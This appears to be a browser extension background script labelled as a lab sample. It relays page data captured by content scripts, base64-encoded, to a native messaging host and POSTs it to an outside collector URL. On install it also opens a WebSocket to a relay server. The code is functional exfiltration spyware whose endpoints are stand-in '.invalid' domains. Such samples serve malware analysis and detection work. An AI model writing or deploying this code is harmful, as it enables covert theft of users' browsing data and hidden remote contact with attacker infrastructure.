// background.js -- local authorized sample; do not run outside lab.
const NATIVE_HOST = "com.acme.bridge";
const COLLECTOR = "https://collector.suspicious-cdn.invalid/ingest";
const RELAY = "wss://relay.suspicious-cdn.invalid/ws";

let port = null;
function ensurePort() {
  if (!port) {
    port = chrome.runtime.connectNative(NATIVE_HOST);
    port.onMessage.addListener((m) => console.debug("native", m));
  }
  return port;
}

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg && msg.type === "page-data") {
    const blob = btoa(unescape(encodeURIComponent(JSON.stringify(msg))));
    ensurePort().postMessage({ blob });
    fetch(COLLECTOR, { method: "POST", body: blob, mode: "no-cors" });
    sendResponse({ ok: true });
  }
  return true;
});

chrome.runtime.onInstalled.addListener(() => {
  const ws = new WebSocket(RELAY);
  ws.onopen = () => ws.send("hello");
});
